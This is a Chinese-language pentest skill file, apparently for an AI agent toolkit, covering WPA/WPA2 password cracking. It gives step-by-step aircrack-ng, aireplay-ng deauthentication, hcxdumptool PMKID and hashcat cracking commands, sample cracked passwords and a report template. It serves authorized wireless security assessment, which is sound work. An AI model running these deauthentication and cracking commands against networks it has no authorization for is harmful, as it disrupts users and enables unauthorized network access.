---
name: cszh-performing-wifi-password-cracking-with-aircrack
description: 在授权无线安全评估中捕获 WPA/WPA2 握手包，并使用 aircrack-ng、hashcat 和字典攻击进行离线密码破解， 以评估密码短语强度和无线网络安全状况。
---

> 来源：killvxk/cybersecurity-skills-zh 上游技能 `performing-wifi-password-cracking-with-aircrack`，正文为中文原文照录（仅剥离上游 frontmatter）。
> 定位：使用 Aircrack-ng 进行 WiFi 密码破解。
> 用法：按正文的「工作流程 / 命令清单 / 输出格式」执行；本技能在 dsh 中的名字是 cszh-performing-wifi-password-cracking-with-aircrack。

# 使用 Aircrack-ng 进行 WiFi 密码破解

## 适用场景

- 在授权无线渗透测试中评估 WPA/WPA2/WPA3 密码短语强度
- 测试无线网络是否使用可被离线破解的弱口令或默认密码
- 捕获和分析四次握手（4-Way Handshake）以评估无线认证安全性
- 向利益相关方演示 WEP、弱 WPA2 密码短语和 PMKID 攻击的风险
- 验证企业无线网络是否使用 802.1X/EAP 而非预共享密钥（PSK）

**不要在**未获明确书面授权的无线网络上使用，不要用于干扰无线通信，不要捕获无权测试的网络握手包。

## 前置条件

- 指定目标 SSID 和无线网络范围的书面授权
- 支持监听模式和数据包注入的无线网卡（Alfa AWUS036ACH、Alfa AWUS036ACM 或类似型号）
- 已安装 aircrack-ng 套件、hashcat 和 hcxtools 的 Kali Linux
- 密码字典（rockyou.txt、SecLists 或自定义的组织专用列表）
- 具备 GPU 的系统用于 hashcat 加速（可选，但对大型字典推荐使用）

## 工作流程

### 步骤 1：准备无线接口

```bash
# 识别无线接口
iwconfig
# 或
iw dev

# 终止可能干扰的进程
sudo airmon-ng check kill

# 启用监听模式
sudo airmon-ng start wlan0
# 输出：monitor mode enabled on wlan0mon

# 验证监听模式
iwconfig wlan0mon
# Mode 应显示 "Monitor"

# 或手动启用监听模式
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### 步骤 2：扫描目标网络

```bash
# 扫描所有信道上的接入点
sudo airodump-ng wlan0mon

# 输出列说明：
# BSSID          PWR  Beacons  #Data  CH  ENC   CIPHER  AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45    120    35   6  WPA2  CCMP    PSK   TargetNetwork

# 识别目标网络参数：
# - BSSID（接入点 MAC 地址）
# - 信道号
# - 加密类型（WPA2-PSK 为目标）
# - 已连接客户端（在下方区域）

# 聚焦扫描目标信道
sudo airodump-ng wlan0mon --channel 6 --bssid AA:BB:CC:DD:EE:FF -w capture
```

### 步骤 3：捕获 WPA2 四次握手

```bash
# 方法 1：等待客户端自然连接
# 保持 airodump-ng 运行，等待 "WPA handshake: AA:BB:CC:DD:EE:FF" 消息
sudo airodump-ng wlan0mon --channel 6 --bssid AA:BB:CC:DD:EE:FF -w handshake_capture

# 方法 2：取消认证客户端强制重连（主动方式）
# 在另一终端向特定客户端发送取消认证包
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 或对所有客户端发送取消认证（广播）
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 方法 3：从 AP 捕获 PMKID（无需客户端）
# 使用 hcxdumptool
sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid_capture.pcapng \
  --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2

# 等待 "PMKID" 消息后转换为 hashcat 格式
hcxpcapngtool -o pmkid_hash.hc22000 pmkid_capture.pcapng

# 验证是否捕获了握手包
aircrack-ng handshake_capture-01.cap
# 应显示：目标 BSSID 旁有 "1 handshake"
```

### 步骤 4：使用 Aircrack-ng 破解（基于 CPU）

```bash
# 使用 rockyou 字典进行破解
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake_capture-01.cap

# 使用多个字典
aircrack-ng -w /usr/share/wordlists/rockyou.txt,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt \
  -b AA:BB:CC:DD:EE:FF handshake_capture-01.cap

# 使用指定 ESSID 破解
aircrack-ng -w /usr/share/wordlists/rockyou.txt -e "TargetNetwork" handshake_capture-01.cap

# 若成功，输出显示：
# KEY FOUND! [ password123 ]
```

### 步骤 5：使用 Hashcat 破解（GPU 加速）

```bash
# 将捕获文件转换为 hashcat 格式
hcxpcapngtool -o hashcat_input.hc22000 handshake_capture-01.cap

# 使用 hashcat 进行字典攻击
hashcat -m 22000 hashcat_input.hc22000 /usr/share/wordlists/rockyou.txt

# 规则攻击（变换字典中的词）
hashcat -m 22000 hashcat_input.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 暴力破解 8 位数字密码
hashcat -m 22000 hashcat_input.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# 掩码攻击（常见模式：单词 + 4 位数字）
hashcat -m 22000 hashcat_input.hc22000 -a 3 -1 ?l?u ?1?1?1?1?1?d?d?d?d

# 针对 PMKID 哈希
hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt

# 显示已破解的密码
hashcat -m 22000 hashcat_input.hc22000 --show
```

### 步骤 6：记录和清理

```bash
# 停止监听模式
sudo airmon-ng stop wlan0mon

# 重启网络服务
sudo systemctl restart NetworkManager

# 生成报告
cat > wifi_assessment_report.txt << 'EOF'
WiFi 安全评估结果
==================
目标 SSID：TargetNetwork
BSSID：AA:BB:CC:DD:EE:FF
加密：WPA2-PSK (CCMP)
信道：6

握手包捕获：成功（方法：客户端取消认证）
破解结果：密码已找到
密码：[安全记录]
破解时间：3 分 47 秒（rockyou.txt，hashcat GPU）

建议：更换为 15 个字符以上、含大小写字母、数字和符号的密码短语，
或迁移至支持 802.1X 的 WPA2/WPA3-Enterprise。
EOF

# 安全处理捕获文件（包含敏感认证材料）
sha256sum handshake_capture-01.cap > evidence_hashes.txt
# 按照评估协议传输至安全证据存储
```

## 核心概念

| 术语 | 定义 |
|------|------|
| **四次握手（4-Way Handshake）** | 客户端与 AP 之间的 WPA/WPA2 认证交换过程，从 PSK 派生会话密钥，可被捕获用于离线密码破解 |
| **PMKID** | 成对主密钥标识符，包含在 AP 发出的第一个 EAPOL 帧中，无需捕获完整握手或连接的客户端即可进行密码破解 |
| **监听模式（Monitor Mode）** | 无线接口模式，可在不关联任何接入点的情况下捕获信道上的所有无线帧 |
| **取消认证攻击（Deauthentication Attack）** | 发送伪造的 802.11 管理帧断开客户端与 AP 的连接，迫使重连以生成可捕获的握手包 |
| **PSK（预共享密钥）** | WPA/WPA2-Personal 网络中所有用户用于认证的静态密码，易受离线字典攻击 |
| **802.1X/EAP** | 使用 RADIUS 服务器的企业无线认证，提供每用户凭证，消除共享密码漏洞 |

## 工具与系统

- **aircrack-ng 套件**：综合无线安全工具集，包含 airodump-ng（捕获）、aireplay-ng（注入）和 aircrack-ng（破解）
- **hashcat**：支持 WPA/WPA2 握手包（模式 22000）的 GPU 加速密码破解工具，支持字典、规则和掩码攻击
- **hcxtools**：用于捕获 PMKID 并将无线捕获转换为 hashcat 兼容格式的工具集
- **hcxdumptool**：专为 PMKID 提取设计的捕获工具，无需客户端取消认证
- **cowpatty**：支持预计算哈希表的 WPA/WPA2 破解工具，可加速字典攻击

## 常见场景

### 场景：企业办公室无线渗透测试

**背景**：一家金融服务公司需要评估其无线网络安全性。他们有三个 SSID：Corp-WiFi（员工使用 WPA2-Enterprise）、Guest-WiFi（访客使用 WPA2-PSK）和 IoT-WiFi（IoT 设备使用 WPA2-PSK）。评估授权测试所有三个网络。

**方法**：
1. 扫描所有三个 SSID，识别其 BSSID、信道和加密类型
2. 通过检查信标帧验证 Corp-WiFi 使用 802.1X/EAP——已确认，无 PSK 可破解
3. 通过取消认证已连接设备并捕获重连来获取 Guest-WiFi 的四次握手包
4. 使用 rockyou.txt 对 Guest-WiFi 握手包运行 hashcat——密码 "Welcome2024!" 在 47 秒内被破解
5. 从 IoT-WiFi 接入点捕获 PMKID（无需取消认证客户端）并使用 hashcat 破解——在 12 秒内找到密码 "iot12345"
6. 演示 Guest-WiFi 和 IoT-WiFi 密码强度不足，易被破解
7. 建议将 Guest-WiFi 迁移至每会话凭证的强制门户，将 IoT-WiFi 密码强度提升至 20 个字符以上

**注意事项**：
- 发送过多取消认证帧，干扰测试范围之外的合法无线用户
- 未使用支持目标网络频段（2.4 GHz 与 5 GHz）的无线网卡
- 尝试使用传统握手包捕获方式破解 WPA3-SAE 网络（SAE 可抵御离线攻击）
- 在共享系统上运行 GPU 破解时未监控温度和功耗

## 输出格式

```
## 无线安全评估报告

**评估日期**：2024-03-15
**位置**：企业办公室，A 楼

### 网络清单

| SSID | BSSID | 加密 | 认证 | 信道 | 可破解 |
|------|-------|------|------|------|--------|
| Corp-WiFi | AA:BB:CC:11:22:33 | WPA2 | 802.1X | 36 | N/A（企业版） |
| Guest-WiFi | AA:BB:CC:44:55:66 | WPA2 | PSK | 6 | 是 - 47 秒 |
| IoT-WiFi | AA:BB:CC:77:88:99 | WPA2 | PSK | 1 | 是 - 12 秒 |

### 发现

**发现 1：Guest-WiFi 密码弱（高危）**
- 密码：「Welcome2024!」（字典攻击 47 秒破解）
- 在 rockyou.txt 前 10 万条目中存在
- 所有访客共享，无轮换策略

**发现 2：IoT-WiFi 密码极弱（严重）**
- 密码：「iot12345」（12 秒破解）
- 默认模式密码，可访问 IoT 设备网络
- IoT-WiFi 与企业资源之间无网络分段

### 建议
1. 将 Guest-WiFi 迁移至每会话凭证的强制门户
2. 将 IoT-WiFi 更换为 20 个字符以上的随机密码短语并按季度轮换
3. 实施网络分段，将 IoT VLAN 与企业资源隔离
4. 考虑为 PSK 网络采用 WPA3-SAE，防止离线破解
5. 启用 802.11w 保护管理帧，防止取消认证攻击
```
